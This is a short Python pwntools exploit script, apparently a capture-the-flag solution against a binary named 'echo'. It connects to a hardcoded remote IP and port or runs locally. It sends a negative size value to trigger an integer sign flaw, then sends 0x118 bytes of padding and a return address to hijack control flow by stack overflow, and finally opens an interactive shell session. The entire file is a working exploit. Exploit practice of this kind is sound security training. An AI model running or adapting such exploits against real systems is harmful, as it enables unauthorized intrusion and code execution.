#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo_patched")

context.log_level = 'info'
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
host = '34.170.146.252'
port = 15774

gdbscript = '''
break main
continue
'''


def conn():
    match args.TYPE:
        case 'REMOTE':
            r = remote(host, port)
        case 'DBG':
            r = gdb.debug([exe.path], gdbscript)
        case _:
            r = process([exe.path])

    return r


def main():
    r = conn()
    r.sendlineafter(b"Size: ", b'-2147483648')
    r.sendlineafter(b"Data: ", b'a' * 0x118 + pack(0x04011f6))
    r.interactive()


if __name__ == "__main__":
    main()
